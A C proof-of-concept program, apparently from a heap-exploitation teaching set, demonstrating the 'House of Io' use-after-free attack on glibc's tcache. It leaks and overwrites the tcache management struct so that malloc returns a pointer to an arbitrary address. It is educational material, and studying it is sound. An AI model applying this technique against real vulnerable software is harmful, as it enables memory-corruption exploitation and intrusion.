#include <assert.h>
#include <malloc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// House of Io - Use after free Variant
// ====================================
//
// Source: https://awaraucom.wordpress.com/2020/07/19/house-of-io-remastered/
//
// Tested on libc versions 2.31, 2.32 and 2.33.
//
// House of Io makes use of the fact, that when freeing a chunk into the tcache
// the chunk will receive a pointer to the tcache management struct which has
// been allocated beforehand. This pointer is the tcache->key entry of a free'd
// tcache chunk. There are three different versions of this attack and all work
// even with safe-link enabled, as the tcache-key pointer, and more importantly
// the pointers in the tcache_perthread_struct, are not protected.
//
// House of Io only works in libc versions 2.29 - 2.33, because in these
// versions the key of a tcache entry is the pointer to the tcache management
// struct. This can allow an attacker to carry out a tcache_metadata_poisoning
// attack.
//
// However the exploit primitives are very constrained as stated in the source.
// Negative overflows are very rare and so is the needed order of specific frees
// for the double free variant. This use after free is a bit more realistic.

unsigned long global_var = 1;

struct overlay {
  uint64_t *next;
  uint64_t *key;
};

struct tcache_perthread_struct {
  uint16_t counts[64];
  uint64_t entries[64];
};

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  puts("In house of Io we make use of the fact, that a free'd tcache chunk\n"
       "gets a pointer to the tcache management struct inserted at the\n"
       "second slot.\n");

  puts(
      "This variant is the use-after-free variant and can be used, if the\n"
      "free'd struct has a pointer at offset +0x08, which can be read from\n"
      "and written to. This pointer will be the tcache->key entry of the\n"
      "free'd chunk, which contains a pointer to the tcache management\n"
      "struct. If we use that pointer we can manipulate the tcache management\n"
      "struct into returning an arbitrary pointer.\n");

  printf("Specifically we get a pointer to the `global_var` at %p returned to\n"
         "us from malloc.\n\n",
         &global_var);

  puts("First we have to allocate a struct, that has a pointer at offset\n"
       "+0x08.\n");
  struct overlay *ptr = malloc(sizeof(struct overlay));

  ptr->next = malloc(0x10);
  ptr->key = malloc(0x10);

  puts("Then we immedietly free that struct to get a pointer to the tcache\n"
       "management struct.\n");
  free(ptr);

  printf("The tcache struct is located at %p.\n\n", ptr->key);
  struct tcache_perthread_struct *management_struct =
      (struct tcache_perthread_struct *)ptr->key;

  puts(
      "Now that we have a pointer to the management struct we can manipulate\n"
      "its values. First we potentially have to increase the counter of the\n"
      "first bin by to a number higher than zero, to make the tcache think we\n"
      "free'd at least one chunk. In our case this is not necesarry because\n"
      "the `overlay` struct fits in the first bin and we have free'd that\n"
      "already. The firest member of the tcache_perthread_struct is the array\n"
      "of counters. So by overwriting the first element of our pointer we set\n"
      "the correct value in the array.\n");
  management_struct->counts[0] = 1;

  printf("Before we overwrite the pointer in the tcache bin, the bin contains\n"
         "[ %p ]. This is the same as the free'd overlay struct which we\n"
         "created at the start [ %p == %p ].\n\n",
         management_struct->entries[0], management_struct->entries[0], ptr);
  management_struct->entries[0] = (uint64_t)&global_var;
  printf(
      "After the write we have placed a pointer to the global variable into\n"
      "the tcache [ %p ].\n\n",
      management_struct->entries[0]);

  puts("If we now allocate a new chunk from that tcache bin we get a pointer\n"
       "to our target location.\n");
  uint64_t *evil_chunk = malloc(0x10);

  assert(evil_chunk == &global_var);
  return 0;
}
